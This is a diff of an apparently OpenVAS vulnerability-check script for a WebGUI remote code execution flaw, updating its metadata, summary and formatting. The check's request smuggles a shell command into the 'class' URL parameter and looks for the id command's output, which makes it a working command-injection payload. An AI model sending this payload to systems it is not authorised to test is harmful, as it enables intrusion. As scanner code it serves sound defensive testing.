@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.20014");
-  script_version("$Revision: 9788 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-05-09 17:53:43 +0200 (Wed, 09 May 2018) $");
+  script_version("2019-04-11T14:06:24+0000");
+  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -45,23 +45,14 @@ if(description)
 
   script_xref(name:"URL", value:"http://www.plainblack.com/getwebgui/advisories/security-exploit-patch-for-6.3-and-above");
 
-  script_tag(name:"summary" , value:"The remote web server contains a CGI script that is prone to arbitrary
-  code execution.
-
-  Description :
-
-  The remote host is running WebGUI, a content management system from
-  Plain Black Software.
-
-  The installed version of WebGUI on the remote host fails to sanitize
-  user-supplied input via the 'class' variable to various sources before
-  using it to run commands.");
+  script_tag(name:"summary", value:"The installed version of WebGUI on the remote host fails to sanitize
+  user-supplied input via the 'class' variable to various sources before using it to run commands.");
 
   script_tag(name:"impact", value:"By leveraging this flaw, an attacker may be
   able to execute arbitrary commands on the remote host within the context of
   the affected web server userid.");
 
-  script_tag(name:"solution" , value:"Upgrade to WebGUI 6.7.6 or later.");
+  script_tag(name:"solution", value:"Upgrade to WebGUI 6.7.6 or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -72,11 +63,10 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-http_check_remote_code (
-                        check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
-                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
-                        extra_check:'<meta name="generator" content="WebGUI 6',
-                        command:"id"
-                        );
+http_check_remote_code(
+  check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
+  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
+  extra_check:'<meta name="generator" content="WebGUI 6',
+  command:"id");
 
 exit( 99 );
